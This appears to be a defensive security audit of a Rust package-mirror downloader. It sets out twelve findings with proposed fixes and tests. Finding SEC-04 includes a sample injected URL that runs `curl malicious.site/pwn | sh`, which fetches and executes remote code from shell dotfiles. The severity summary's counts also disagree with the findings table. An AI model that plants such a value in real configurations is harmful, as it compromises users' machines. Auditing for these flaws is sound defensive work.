# PackageDownloader 2.0 — Production Hardening & Security Audit

**Document Version:** 1.0.0  
**Audit Date:** November 3, 2026  
**Auditor:** Antigravity Engineering & Security Team  
**Scope:** IR-Flutter/PackageDownloader (Rust implementation, Registry, Installers, CI/CD)  
**Target Branch:** `production-hardening`

---

## 1. Executive Summary

This audit evaluates the PackageDownloader 2.0 Rust codebase to identify security vulnerabilities, reliability defects, configuration management risks, and supply-chain weaknesses before production hardening and mirror expansion.

Twelve distinct findings were identified across the core engine, registry system, shell configuration, transaction manager, Gradle provider, benchmarking engine, installers, and CI/CD pipelines.

### Severity Summary
- **P0 (Critical / Security):** 4 findings
- **P1 (High / Reliability & Safety):** 7 findings
- **P2 (Medium / Quality & Observability):** 1 finding

---

## 2. Findings Matrix

| Finding ID | Severity | Category | Affected Components | Description | Verification Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **SEC-01** | **P0** | Cryptography / Cache | `src/core/registry.rs` | Registry cache invalidation via JSON re-serialization | Confirmed present in source |
| **SEC-02** | **P0** | Security / Registry | `src/core/registry.rs`, `registry/schema.json` | Missing real JSON Schema & semantic validation | Confirmed present in source |
| **SEC-03** | **P0** | Security / Replay | `src/core/registry.rs`, `src/infrastructure/storage.rs` | Anti-rollback bypassable via `force` & missing persistent revision state | Confirmed present in source |
| **SEC-04** | **P0** | Security / Shell | `src/system/environment.rs` | Unsafe shell variable interpolation allowing command injection | Confirmed present in source |
| **SEC-05** | **P1** | Reliability / Shell | `src/system/environment.rs` | Modifying all user shell dotfiles simultaneously without shell targeting | Confirmed present in source |
| **REL-01** | **P1** | Data Integrity | `src/system/backup.rs`, `src/system/filesystem.rs` | Lossy UTF-8 conversion & missing file permission preservation in backup restoration | Confirmed present in source |
| **REL-02** | **P1** | Transaction Safety | `src/core/transaction.rs`, `src/core/errors.rs` | Swallowing rollback errors during partial transaction failure | Confirmed present in source |
| **REL-03** | **P1** | Cross-Platform | `src/app/commands/mod.rs` | Unix-specific `which` invocation failing command discovery on Windows | Confirmed present in source |
| **SEC-06** | **P1** | Supply Chain / Installer | `install.sh`, `install.ps1` | Installers fail open on missing or failed checksum downloads | Confirmed present in source |
| **REL-04** | **P1** | Gradle Reliability | `src/providers/gradle.rs` | Gradle provider silent exception masking & missing wrapper distribution support | Confirmed present in source |
| **REL-05** | **P1** | Benchmark Reliability | `src/core/benchmark.rs` | Superficial benchmark quality scoring declaring mirrors healthy on partial probes | Confirmed present in source |
| **SEC-07** | **P1** | CI/CD / Automation | `.github/workflows/` | Missing automated PR registry validation & automated signing workflows | Confirmed present in source |

---

## 3. Detailed Technical Findings

### SEC-01: Registry Cache Invalidation via JSON Re-Serialization (P0)
- **Affected File:** `src/core/registry.rs` (lines 188–212)
- **Root Cause:** When `update_remote` downloads the remote registry, it cryptographically verifies `json_bytes` against `sig_text`. However, before storing the cached registry, it parses the document into `RegistryDocument` and re-serializes it via `serde_json::to_string_pretty`.
- **Security / Reliability Impact:** Re-serializing alters character formatting, spacing, and key ordering. If the re-serialized payload differs by even a single byte from the signed upstream canonical payload, subsequent signature verification during `load_cached` fails, rendering the local cache unreadable and causing unexpected fallbacks.
- **Proposed Solution:** 
  1. Store the exact raw downloaded bytes and signature file as a single logical cache generation.
  2. Write to a staging directory (`<generation_id>.tmp`), verify the staged generation in place, and atomically activate the generation.
  3. Maintain the last known good generation and automatically recover if the active generation is corrupted.
- **Regression Test Requirements:** `tests/registry_hardening_test.rs`: `test_cache_preserves_exact_signed_bytes_and_atomic_switch`
- **Status:** Confirmed present in baseline.

---

### SEC-02: Missing Real JSON Schema & Deep Semantic Validation (P0)
- **Affected Files:** `src/core/registry.rs`, `registry/schema.json`
- **Root Cause:** `validate_schema` in `registry.rs` only checks `doc.schema_version > CURRENT_SUPPORTED_SCHEMA_VERSION` and `!doc.mirrors.is_empty()`. It does not validate against `registry/schema.json`, nor does it perform semantic checks.
- **Security Impact:** An invalid or tampered remote registry could include duplicate mirror IDs, unsupported URL schemes (`file://`, `ftp://`, `javascript:`), disabled providers with malformed properties, invalid capability flags, or out-of-range priority values without detection.
- **Proposed Solution:**
  1. Embed and compile `registry/schema.json` and validate registry JSON against the full draft-07 JSON Schema.
  2. Implement semantic validation:
     - Duplicate mirror ID rejection
     - URL scheme validation (strictly `https://` or `http://` where explicitly permitted)
     - Enabled provider endpoint completeness (e.g. enabled `dart` must have `hosted_url`)
     - Priority bounds validation ($1 \leq \text{priority} \leq 1000$)
     - Unsupported provider type rejection
- **Regression Test Requirements:** `tests/registry_hardening_test.rs`: `test_semantic_validation_rejects_duplicates_and_invalid_urls`
- **Status:** Confirmed present in baseline.

---

### SEC-03: Anti-Rollback Bypassed by `force` & Missing Persistent Monotonic Revision State (P0)
- **Affected Files:** `src/core/registry.rs`, `src/infrastructure/storage.rs`
- **Root Cause:** In `update_remote`, passing `force = true` explicitly bypasses the `remote_doc.revision <= active.revision` check. Furthermore, the active revision is calculated only from present cache or bundled files; deleting the cache silently resets the accepted revision baseline to the bundled revision.
- **Security Impact:** An attacker in a position to replay network traffic could downgrade a client from revision 42 to revision 1 (or force-apply an older signed registry), reviving compromised mirror endpoints or outdated security configurations.
- **Proposed Solution:**
  1. Persist the monotonically increasing accepted revision in a protected state file (`accepted_revision.state`).
  2. Forbid `force` from bypassing signature or anti-rollback security checks (the `force` flag may only force re-downloading the *same* or *newer* revision, never an older one).
  3. Define and document administrative recovery procedures.
- **Regression Test Requirements:** `tests/registry_hardening_test.rs`: `test_anti_rollback_cannot_be_bypassed_even_with_force`
- **Status:** Confirmed present in baseline.

---

### SEC-04: Unsafe Shell Variable Interpolation Allowing Command Injection (P0)
- **Affected File:** `src/system/environment.rs` (lines 50–63)
- **Root Cause:** `render_unix_block` formats export lines as `format!("export {k}=\"{v}\"")` without escaping double quotes, dollar signs, backticks, or validating for newline characters.
- **Security Impact:** If a mirror definition in the registry contains a crafted endpoint URL (e.g. `https://pub-azs.ir"; $(curl malicious.site/pwn \| sh); #`), sourcing `.zshrc` or `.bashrc` executes arbitrary shell commands in the user's terminal session.
- **Proposed Solution:**
  1. Strictly validate all URL values against standard RFC 3986 URL rules before allowing them into the environment plan.
  2. Reject any value containing newline (`\n`, `\r`), unprintable, or dangerous control characters.
  3. Use single-quote shell escaping or escape internal characters safely.
- **Regression Test Requirements:** `tests/environment_hardening_test.rs`: `test_shell_escaping_and_injection_rejection`
- **Status:** Confirmed present in baseline.

---

### SEC-05: Modifying All User Shell Dotfiles Simultaneously (P1)
- **Affected File:** `src/system/environment.rs` (lines 19–48)
- **Root Cause:** `get_unix_shell_files` searches for `.zshrc`, `.bash_profile`, `.bashrc`, and `.profile`. If multiple files exist, it returns all of them, and `plan_unix_file_update` modifies every single one of them.
- **Reliability Impact:** Overwrites and pollutes multiple configuration files that the user may not even be using, creates synchronization discrepancies between shells, and increases the blast radius of any file modification error.
- **Proposed Solution:**
  1. Detect the current running shell from `$SHELL` (or fallback to platform primary shell: Zsh on macOS, Bash on Linux).
  2. Modify only the single designated primary configuration file (e.g. `~/.zshrc` on macOS, `~/.bashrc` on Linux).
  3. Allow optional `--target-shell-file` override for advanced users.
- **Regression Test Requirements:** `tests/environment_hardening_test.rs`: `test_targeted_shell_file_selection`
- **Status:** Confirmed present in baseline.

---

### REL-01: Lossy UTF-8 Conversion & Missing File Permissions in Backup Restore (P1)
- **Affected Files:** `src/system/backup.rs`, `src/system/filesystem.rs`
- **Root Cause:** `BackupManager::restore` writes restored files using `atomic_write(&record.original_path, &String::from_utf8_lossy(&content))`. If the restored file contains non-UTF-8 characters or binary headers, `from_utf8_lossy` irreversibly corrupts the data with replacement characters (`U+FFFD`). Furthermore, Unix file mode bits are not stored or restored.
- **Reliability Impact:** Risk of permanent data loss or file permission degradation when restoring dotfiles or Gradle configuration files.
- **Proposed Solution:**
  1. Make backup and restore strictly byte-preserving (`atomic_write_bytes(path, &[u8])`).
  2. Record and restore Unix file permissions (`fs::Permissions`).
- **Regression Test Requirements:** `tests/backup_hardening_test.rs`: `test_byte_preserving_binary_restore_and_permission_retention`
- **Status:** Confirmed present in baseline.

---

### REL-02: Swallowing Rollback Errors During Partial Transaction Failure (P1)
- **Affected Files:** `src/core/transaction.rs`, `src/core/errors.rs`
- **Root Cause:** When an error occurs during `apply_plan_items`, `unwind_rollback` iterates through the rollback stack and logs errors using `error!()`, but returns nothing. The user only receives the original transaction failure.
- **Reliability Impact:** If a rollback action fails (e.g. permissions error, disk full), the user is left in a corrupted half-configured state with no programmatic indication of which files could not be restored.
- **Proposed Solution:**
  1. Capture all rollback errors into a structured `TransactionWithRollbackFailed` error type.
  2. Return the list of successfully restored files, failed restorations, and explicit manual recovery steps.
- **Regression Test Requirements:** `tests/transaction_hardening_test.rs`: `test_transaction_rollback_failure_reporting`
- **Status:** Confirmed present in baseline.

---

### REL-03: Unix-Specific `which` Invocation Failing Command Discovery on Windows (P1)
- **Affected File:** `src/app/commands/mod.rs` (lines 48–53)
- **Root Cause:** `handle_doctor` discovers development tools (`flutter`, `dart`, `gradle`, `javac`) by executing `std::process::Command::new("which").arg(tool)`. `which` is a Unix binary not installed by default on Windows.
- **Reliability Impact:** On Windows, `pdown doctor` always fails to detect installed development tools, misleading users into believing their environment is broken.
- **Proposed Solution:**
  1. Implement platform-appropriate command discovery: on Windows, search `PATH` and `PATHEXT` (or invoke `where.exe`); on Unix, search `PATH` or invoke `which`.
- **Regression Test Requirements:** `tests/cross_platform_hardening_test.rs`: `test_command_discovery_platform_agnostic`
- **Status:** Confirmed present in baseline.

---

### SEC-06: Installers Fail Open on Missing or Failed Checksum Downloads (P1)
- **Affected Files:** `install.sh` (lines 63–80), `install.ps1` (lines 37–51)
- **Root Cause:** In `install.sh`, if `curl` fails to download `checksums.txt`, the script skips verification and proceeds to install the binary. In `install.ps1`, a catch block explicitly prints `"Proceeding with downloaded binary."` and installs unverified code.
- **Security Impact:** In a man-in-the-middle or transient network failure scenario, users can end up running incomplete, corrupted, or malicious binaries without warning.
- **Proposed Solution:**
  1. Make checksum verification mandatory (fail-closed).
  2. If `checksums.txt` cannot be retrieved or verification fails, abort immediately with exit code 1.
  3. Validate downloaded binary architecture and file size.
- **Regression Test Requirements:** Test scripts verifying exit code 1 when checksum does not match or cannot be fetched.
- **Status:** Confirmed present in baseline.

---

### REL-04: Gradle Provider Silent Exception Masking & Missing Wrapper Distribution Support (P1)
- **Affected File:** `src/providers/gradle.rs`
- **Root Cause:** `pdown-mirror.gradle` wraps repository rewrites in `catch (ignored) {}`, masking script evaluation errors. Furthermore, Gradle Wrapper distribution configuration (`gradle-wrapper.properties` or `distributionUrl`) is not managed.
- **Reliability Impact:** If a mirror does not provide a required Gradle plugin or distribution, builds fail with opaque errors without diagnostic explanations.
- **Proposed Solution:**
  1. Remove silent exception masking; emit diagnostic notes.
  2. Add capability to manage Gradle distribution mirrors in `gradle/wrapper/gradle-wrapper.properties` non-destructively.
- **Regression Test Requirements:** `tests/gradle_hardening_test.rs`: `test_gradle_init_script_diagnostics_and_wrapper_support`
- **Status:** Confirmed present in baseline.

---

### REL-05: Superficial Benchmark Quality Scoring (P1)
- **Affected File:** `src/core/benchmark.rs`
- **Root Cause:** `overall_reachable` is marked `true` if even a single probe succeeds out of multiple ecosystems. Ranking is based purely on average latency across successful probes.
- **Reliability Impact:** A mirror with broken Flutter Storage and broken Google Maven can be ranked as the top mirror simply because its single Dart Pub probe responded with low latency.
- **Proposed Solution:**
  1. Implement multi-factor weighted scoring: Availability (40%), Reliability (25%), Latency (20%), Throughput (15%).
  2. Track per-capability health status.
  3. Prevent mirrors with broken enabled ecosystems from being recommended as primary.
- **Regression Test Requirements:** `tests/benchmark_hardening_test.rs`: `test_benchmark_weighted_scoring_and_unhealthy_ecosystem_penalty`
- **Status:** Confirmed present in baseline.

---

### SEC-07: Missing Automated PR Registry Validation & Dedicated Signing CI Workflows (P1)
- **Affected Files:** `.github/workflows/ci.yml`, `.github/workflows/`
- **Root Cause:** The CI pipeline does not validate `registry/mirrors.json` against `registry/schema.json`, does not verify the registry signature, and does not provide an automated signing workflow with protected GitHub secrets.
- **Supply Chain Impact:** Invalid or unverified mirror definitions could be committed to `main` without automated cryptographic validation.
- **Proposed Solution:**
  1. Add registry validation job to `ci.yml`.
  2. Implement dedicated signing workflow with protected secret handling.
- **Status:** Confirmed present in baseline.

---

## 4. Audit Conclusion & Implementation Roadmap

The PackageDownloader 2.0 Rust codebase has a strong foundation, but requires immediate hardening across these 12 findings. The execution will proceed through the prioritized stages:
- **Stage B:** Critical Security & Integrity Fixes (SEC-01, SEC-02, SEC-03, SEC-04, SEC-05, REL-01, REL-02, SEC-06).
- **Stage C:** Mirror Registry Expansion (Candidate endpoint verification, provider capabilities, schema upgrade, signature generation).
- **Stage D:** Runtime Reliability & Cross-Platform (REL-03, REL-04, REL-05).
- **Stage E:** CI/CD Quality Gates & Documentation (SEC-07).
- **Stage F:** Final Verification & Comprehensive Hardening Report.
